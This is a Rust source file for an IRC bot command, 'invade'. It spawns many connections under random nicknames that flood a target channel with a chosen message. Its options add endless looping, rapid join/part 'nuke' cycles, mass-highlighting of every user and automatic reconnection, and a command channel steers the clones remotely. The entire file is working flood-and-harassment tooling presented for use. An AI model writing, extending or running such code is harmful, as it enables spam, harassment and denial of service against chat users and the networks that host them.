use crate::modules::Command;

use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use openssl::ssl::{SslConnector, SslMethod};
use serde::Deserialize;
use toml::{Value, to_string};
use colored::*;
use leetspeak;
use regex::Regex;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, mpsc, Mutex};
use rand::seq::SliceRandom; 
use rand::thread_rng;
// add proxy support

// add support for multiple servers

#[derive(Clone, Deserialize)]
struct Config {
    server: String,
    port: u16,
}

pub struct InvadeCommand {
    kill_flag: Arc<AtomicBool>,
    kill_sender: Option<mpsc::Sender<()>>,
}

impl InvadeCommand {
    pub fn new() -> Self {
        Self {
            kill_flag: Arc::new(AtomicBool::new(false)),
            kill_sender: None,
        }
    }
}

impl Command for InvadeCommand {
    fn handle(&mut self, message: &str) -> Vec<String> {
        let mut response = vec![];

        if message.contains("PRIVMSG") && message.contains(":%invade") {
            
            let parts: Vec<&str> = message.split_whitespace().collect();
            let num_invaders = parts[4].parse::<u32>().unwrap_or(1) as usize;
            let channel = parts[2];
            let invadechannel = parts[5];
            let re = Regex::new(r#""([^"]*)""#).unwrap();
            let scream = re.captures(message).and_then(|cap| cap.get(1)).map_or("", |m| m.as_str());
            let delay_str = if parts.len() > 7 { parts[7] } else { "5s" };
            let mut loop_scream = false;
            let mut nuke = false;
            let mut reconnect = false;
            let mut ping_all = false;
            let mut rainbow = false;
            let mut wait_join_duration = std::time::Duration::from_secs(0); // Default wait duration
            for part in &parts[8..] {
                match *part {
                    "loop" => loop_scream = true,
                    "nuke" => nuke = true,
                    "reconnect" => reconnect = true,
                    "pingall" => ping_all = true,
                    "rainbow" => rainbow = true,
                    option if option.starts_with("waitjoin=") => {
                        let wait_duration = option.trim_start_matches("waitjoin=").trim_end_matches('s');
                        let wait_secs = wait_duration.parse::<u64>().unwrap_or(0);
                        wait_join_duration = std::time::Duration::from_secs(wait_secs);
                    }
                    _ => {}
                }
            }
            // Parsing the delay duration (Assumes delay string ends with 's' for seconds)
            let delay_secs = delay_str.trim_end_matches('s').parse::<u64>().unwrap_or(0);
            let delay_duration = std::time::Duration::from_secs(delay_secs);

            let config_str = std::fs::read_to_string("config.toml").unwrap();
            let config_value = config_str.parse::<Value>().unwrap();
            let config: Config = config_value.try_into().unwrap();

            let (kill_sender, kill_receiver) = mpsc::channel();
            self.kill_sender = Some(kill_sender);
            let kill_receiver = Arc::new(Mutex::new(kill_receiver));

            for _invader in 1..=num_invaders {
                let thread_channel = invadechannel.to_string();
                let config_clone = config.clone();
                let screaming = scream.to_string();
                let command_channel = channel.to_string();

                let thread_invader = random_word::gen();

                let kill_flag_clone = Arc::clone(&self.kill_flag);
                let kill_receiver = Arc::clone(&kill_receiver);

                // fix this so it only delays for connection not entire invader processing 
                std::thread::sleep(delay_duration);

                std::thread::spawn(move || {
                    std::thread::sleep(delay_duration);
                    std::thread::sleep(wait_join_duration); // Wait before connecting to the channel

                    let stream = TcpStream::connect((config_clone.server.as_str(), config_clone.port)).unwrap();
                    let connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
                    let mut ssl_stream = connector.connect(config_clone.server.as_str(), stream).unwrap();

                    let nick_command = format!("NICK {}\r\n", thread_invader);
                    let user_command = format!("USER {} 0 * :{}\r\n", thread_invader, thread_invader);
                    ssl_stream.write_all(nick_command.as_bytes()).unwrap();
                    ssl_stream.write_all(user_command.as_bytes()).unwrap();
                    let join_command = format!("JOIN {} \r\n", thread_channel);
                    let commander = format!("JOIN {} \r\n", command_channel);
                    ssl_stream.write_all(commander.as_bytes()).unwrap();
                    ssl_stream.write_all(join_command.as_bytes()).unwrap();
                    std::thread::sleep(wait_join_duration); // Wait before sending the message to the channel
                    let msg = format!("PRIVMSG {} :{}\r\n", thread_channel, screaming);
                    ssl_stream.write_all(msg.as_bytes()).unwrap();

                    loop {
                        if kill_flag_clone.load(Ordering::SeqCst) {
                            ssl_stream.shutdown().unwrap();
                            return;
                        }
                        if let Ok(_) = kill_receiver.lock().unwrap().try_recv() {
                            ssl_stream.shutdown().unwrap();
                            return;
                        }

                        ssl_stream.write_all(msg.as_bytes()).unwrap();
                        if loop_scream && !kill_flag_clone.load(Ordering::SeqCst) {
                            let msg = format!("PRIVMSG {} :{}\r\n", thread_channel, screaming);
                            ssl_stream.write_all(msg.as_bytes()).unwrap();
                        }
                        if nuke && !kill_flag_clone.load(Ordering::SeqCst) {
                            let join_command = format!("JOIN {} \r\n", thread_channel);
                            ssl_stream.write_all(join_command.as_bytes()).unwrap();
                            let msg = format!("PRIVMSG {} :{}\r\n", thread_channel, screaming);
                            ssl_stream.write_all(msg.as_bytes()).unwrap();
                            let part_command = format!("PART {} \r\n", thread_channel);
                            ssl_stream.write_all(part_command.as_bytes()).unwrap();
                            std::thread::sleep(delay_duration);
                        } else if loop_scream && !kill_flag_clone.load(Ordering::SeqCst) {
                            let msg = format!("PRIVMSG {} :{}\r\n", thread_channel, screaming);
                            ssl_stream.write_all(msg.as_bytes()).unwrap();

                            
                        }
                        if ping_all {
                            let names_command = format!("NAMES {}\r\n", thread_channel);
                            ssl_stream.write_all(names_command.as_bytes()).unwrap();
        
                            let mut nicknames: Vec<String> = Vec::new();
        
                            loop {
                                let mut buf = [0; 512];
                                match ssl_stream.ssl_read(&mut buf) {
                                    Ok(0) => break,
                                    Ok(n) => {
                                        let received = String::from_utf8_lossy(&buf[0..n]);
                                        let message = received.trim();
        
                                        if message.starts_with(&format!(":{} 353", config_clone.server.as_str())) { // Numeric reply for NAMES command
                                            let name_list = message.split(":").last().unwrap_or("");
                                            nicknames.extend(name_list.split_whitespace().map(|s| s.to_string()));
                                        } else if message.starts_with(&format!(":{} 366", config_clone.server.as_str())) { // Numeric reply for end of NAMES
                                            break;
                                        }
                                    }
                                    Err(_) => break,
                                }
                            }

                            
                            
        
                            // Construct a message by joining all the names together with commas and prefix each name with '@'
                            let nicknames_message = nicknames.iter().map(|name| format!("@{}", name)).collect::<Vec<_>>().join(", ");
                            let ping_message = format!("PRIVMSG {} :{}\r\n", thread_channel, nicknames_message);
                            ssl_stream.write_all(ping_message.as_bytes()).unwrap();
        
                            if loop_scream {
                                loop {
                                    if kill_flag_clone.load(Ordering::SeqCst) {
                                        ssl_stream.shutdown().unwrap();
                                        return;
                                    }
        
                                    if let Ok(_) = kill_receiver.lock().unwrap().try_recv() {
                                        ssl_stream.shutdown().unwrap();
                                        return;
                                    }
        
                                    ssl_stream.write_all(ping_message.as_bytes()).unwrap();
                                    std::thread::sleep(delay_duration);
                                }
                            }
                        }
                        
                        

                        
                        let mut buf = [0; 512];
                        match ssl_stream.ssl_read(&mut buf) {
                            Ok(0) => break,
                            Ok(n) => {
                                
                                let received = String::from_utf8_lossy(&buf[0..n]);
                                let message = received.trim();
                
                                //debug chat 
                                println!("{} {} {}","[%] DEBUG:".bold().green(), thread_invader.green(), received.blue());

                                if message.starts_with("PING") {
                                    let response = message.replace("PING", "PONG");
                                    println!("{} {}","[%] PONG:".bold().green(), thread_invader.blue());
                                    ssl_stream.write_all(response.as_bytes()).unwrap();
                                }
                                if message.starts_with(&format!(":{} 433", config_clone.server.as_str())) { // Numeric reply for nickname in use
                                    let leet_nick = leetspeak::translate_with_level(&thread_invader, &leetspeak::Level::One);
                                    let nick_command = format!("NICK {}\r\n", leet_nick);
                                    let user_command = format!("USER {} 0 * :{}\r\n", thread_invader, thread_invader);

                                    ssl_stream.write_all(nick_command.as_bytes()).unwrap();
                                    ssl_stream.write_all(user_command.as_bytes()).unwrap();

                                    let join_command = format!("JOIN {} \r\n", thread_channel);
                                    let commander = format!("JOIN {} \r\n", command_channel);
                                    ssl_stream.write_all(commander.as_bytes()).unwrap();
                                    ssl_stream.write_all(join_command.as_bytes()).unwrap();
                                    ssl_stream.write_all(msg.as_bytes()).unwrap();

                                    return;
                                }
                            // turn to mods
                                // setup so these will only run from the server admin to avoid handle/host conflicts 
                                let commandi = format!("PRIVMSG {} :%%",command_channel); // & check for admin and verify with server 
                                
                                if message.contains(&commandi) && message.contains(":%%") {
                                    if message.contains("PRIVMSG") && message.contains(":%%join") { // fix so commands get picked up faster
                                        let parts: Vec<&str> = message.splitn(3, ":%%join ").collect();
                                        let invade_channel = parts[1];
                                        let response = format!("JOIN {} \r\n", invade_channel);
                                        ssl_stream.write_all(response.as_bytes()).unwrap();
                                    }
                                    if message.contains("PRIVMSG") && message.contains(":%%leave") {
                                        let parts: Vec<&str> = message.splitn(3, ":%%leave ").collect();
                                        let invade_channel = parts[1];
                                        let response = format!("PART {} \r\n", invade_channel);
                                        ssl_stream.write_all(response.as_bytes()).unwrap();
                                    }
                                    if message.contains("PRIVMSG") && message.contains(":%%scream") {
                                        let re = Regex::new(r#"%%scream\s+([^"]+?)\s+"([^"]*?)"\s*"#).unwrap();
                                        if let Some(captures) = re.captures(message) {
                                            let invade_channel = captures.get(1).map_or("", |m| m.as_str());
                                            let scream = captures.get(2).map_or("", |m| m.as_str());
                                            let response = format!("PRIVMSG {} :{}\r\n", invade_channel, scream);
                                            ssl_stream.write_all(response.as_bytes()).unwrap();
                                        }
                                    }
                                    if loop_scream && !kill_flag_clone.load(Ordering::SeqCst) {
                                        let msg = format!("PRIVMSG {} :{}\r\n", thread_channel, screaming);
                                        ssl_stream.write_all(msg.as_bytes()).unwrap();
                                    }
                                    
                                    //if message.contains("PRIVMSG") && message.contains(":%%kill") {
                                    //    std::thread::process::exit(0);
//
                                    //}
                                }
                            // ...1
                            }
                            Err(e) => {
                                eprintln!("{} {}","[!] ERROR FROM SERVER:".on_red(), e);
                    
                                if reconnect {
                                    // You might want to sleep for a short duration before trying to reconnect
                                    // to avoid flooding the server with connection attempts.
                                    std::thread::sleep(std::time::Duration::from_secs(5));
                    
                                    let stream = TcpStream::connect((config_clone.server.as_str(), config_clone.port)).unwrap();
                                    let connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
                                    ssl_stream = connector.connect(config_clone.server.as_str(), stream).unwrap();
                    
                                    let nick_command = format!("NICK {}\r\n", thread_invader);
                                    let user_command = format!("USER {} 0 * :{}\r\n", thread_invader, thread_invader);
                                    ssl_stream.write_all(nick_command.as_bytes()).unwrap();
                                    ssl_stream.write_all(user_command.as_bytes()).unwrap();
                    
                                    let join_command = format!("JOIN {} \r\n", thread_channel);
                                    let commander = format!("JOIN {} \r\n", command_channel);
                                    ssl_stream.write_all(commander.as_bytes()).unwrap();
                                    ssl_stream.write_all(join_command.as_bytes()).unwrap();
                                    let msg = format!("PRIVMSG {} :{}\r\n", thread_channel, screaming);
                                    ssl_stream.write_all(msg.as_bytes()).unwrap();
                                } else {
                                    break;
                                }
                            }
                        }
                    }
                });
            }

            response.push(format!("PRIVMSG {} :\x0304,01[!] INVADING {} WITH {} INVADERS...\x0f\r\n", channel, invadechannel, num_invaders));
        } else if message.contains("PRIVMSG") && message.contains(":%%kill") {
            let channel = message.split("PRIVMSG ").nth(1).and_then(|s| s.splitn(2, ' ').next()).unwrap();
            if let Some(kill_sender) = &self.kill_sender {
                let _ = kill_sender.send(());
            }
            self.kill_flag.store(true, Ordering::SeqCst);
            response.push(format!("PRIVMSG {} :\x0304,01[!] TERMINATING ALL INVADERS...\x0f\r\n", channel));
        }

        response
    }
}